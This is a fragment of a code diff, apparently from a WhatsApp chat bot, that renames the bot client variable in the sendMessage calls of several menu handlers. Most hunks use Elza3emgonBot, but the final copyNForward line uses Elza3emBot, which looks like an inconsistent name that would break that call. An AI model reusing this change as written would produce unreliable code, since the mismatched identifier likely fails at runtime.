+const sendMsg = await Elza3emgonBot.sendMessage(m.chat, buttonMessage)
 }
 break
             case 'imageeffectmenu':{
@@ -10637,7 +10618,7 @@ const buttonMessage = {
     buttons: buttons,
     headerType: 4
 }
-const sendMsg = await ElgazarBot.sendMessage(m.chat, buttonMessage)
+const sendMsg = await Elza3emgonBot.sendMessage(m.chat, buttonMessage)
 }
 break
 case 'animemenu':{
@@ -10707,7 +10688,7 @@ const buttonMessage = {
     buttons: buttons,
     headerType: 4
 }
-const sendMsg = await ElgazarBot.sendMessage(m.chat, buttonMessage)
+const sendMsg = await Elza3emgonBot.sendMessage(m.chat, buttonMessage)
 }
 break
             case 'stickermenu':{
@@ -10737,7 +10718,7 @@ const buttonMessage = {
     buttons: buttons,
     headerType: 4
 }
-const sendMsg = await ElgazarBot.sendMessage(m.chat, buttonMessage)
+const sendMsg = await Elza3emgonBot.sendMessage(m.chat, buttonMessage)
 }
 break
 case 'animestickermenu':{
@@ -10785,7 +10766,7 @@ const buttonMessage = {
     buttons: buttons,
     headerType: 4
 }
-const sendMsg = await ElgazarBot.sendMessage(m.chat, buttonMessage)
+const sendMsg = await Elza3emgonBot.sendMessage(m.chat, buttonMessage)
 }
 break 
 case 'nsfwmenu':{
@@ -10839,7 +10820,7 @@ const buttonMessage = {
     buttons: buttons,
     headerType: 4
 }
-const sendMsg = await ElgazarBot.sendMessage(m.chat, buttonMessage)
+const sendMsg = await Elza3emgonBot.sendMessage(m.chat, buttonMessage)
 }
 break
 case 'funmenu':{
@@ -10933,7 +10914,7 @@ const buttonMessage = {
     buttons: buttons,
     headerType: 4
 }
-const sendMsg = await ElgazarBot.sendMessage(m.chat, buttonMessage)
+const sendMsg = await Elza3emgonBot.sendMessage(m.chat, buttonMessage)
 }
 break
 case 'soundmenu':{
@@ -11113,7 +11094,7 @@ const buttonMessage = {
     buttons: buttons,
     headerType: 4
 }
-const sendMsg = await ElgazarBot.sendMessage(m.chat, buttonMessage)
+const sendMsg = await Elza3emgonBot.sendMessage(m.chat, buttonMessage)
 }
 break
 case 'gamemenu':{
@@ -11139,7 +11120,7 @@ const buttonMessage = {
     buttons: buttons,
     headerType: 4
 }
-const sendMsg = await ElgazarBot.sendMessage(m.chat, buttonMessage)
+const sendMsg = await Elza3emgonBot.sendMessage(m.chat, buttonMessage)
 }
 break
             case 'anonymousmenu':{
@@ -11162,7 +11143,7 @@ const buttonMessage = {
     buttons: buttons,
     headerType: 4
 }
-const sendMsg = await ElgazarBot.sendMessage(m.chat, buttonMessage)
+const sendMsg = await Elza3emgonBot.sendMessage(m.chat, buttonMessage)
 }
 break
 case 'databasemenu':{
@@ -11189,7 +11170,7 @@ const buttonMessage = {
     buttons: buttons,
     headerType: 4
 }
-const sendMsg = await ElgazarBot.sendMessage(m.chat, buttonMessage)
+const sendMsg = await Elza3emgonBot.sendMessage(m.chat, buttonMessage)
 }
 break
 case 'othermenu':{
@@ -11228,7 +11209,7 @@ const buttonMessage = {
     buttons: buttons,
     headerType: 4
 }
-const sendMsg = await ElgazarBot.sendMessage(m.chat, buttonMessage)
+const sendMsg = await Elza3emgonBot.sendMessage(m.chat, buttonMessage)
 }
 break
 case 'warmenu':{
@@ -11277,7 +11258,7 @@ const buttonMessage = {
     buttons: buttons,
     headerType: 4
 }
-const sendMsg = await ElgazarBot.sendMessage(m.chat, buttonMessage)
+const sendMsg = await Elza3emgonBot.sendMessage(m.chat, buttonMessage)
 }
 break
             default:
@@ -11341,7 +11322,7 @@ break
 		    if (m.isBaileys) return
 		    let msgs = global.db.data.database
 		    if (!(budy.toLowerCase() in msgs)) return
-		    ElgazarBot.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
+		    Elza3emBot.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
 		}
         }       
 
